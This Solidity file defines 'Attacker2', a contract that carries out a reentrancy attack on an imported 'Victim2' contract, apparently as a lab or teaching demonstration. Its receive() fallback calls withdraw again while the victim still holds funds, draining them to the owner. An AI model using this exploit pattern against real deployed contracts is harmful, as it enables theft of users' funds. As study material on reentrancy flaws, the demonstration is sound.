// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Victim2.sol";

contract Attacker2 {
    Victim2 public victim;
    address public owner;
    uint256 public withdrawAmount;
    uint256 public remainingCalls;

    constructor(address payable _victim) {
        victim = Victim2(payable(_victim));
        owner = msg.sender;
    }

    function initiateAttack(uint256 _withdrawAmount, uint256 _calls) external payable {
        require(msg.sender == owner, "Only owner");
        
        withdrawAmount = _withdrawAmount;
        remainingCalls = _calls;
        
        // Deposit the initial funds to establish a balance
        victim.deposit{value: msg.value}();
        
        // Start the reentrancy attack
        victim.withdraw(_withdrawAmount);
    }

    function withdrawFunds() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        if (remainingCalls > 1 && address(victim).balance >= withdrawAmount && gasleft() > 50000) {
            remainingCalls--;
            victim.withdraw(withdrawAmount); // ✅ FIXED: Use consistent withdrawal amount
        }
    }
}
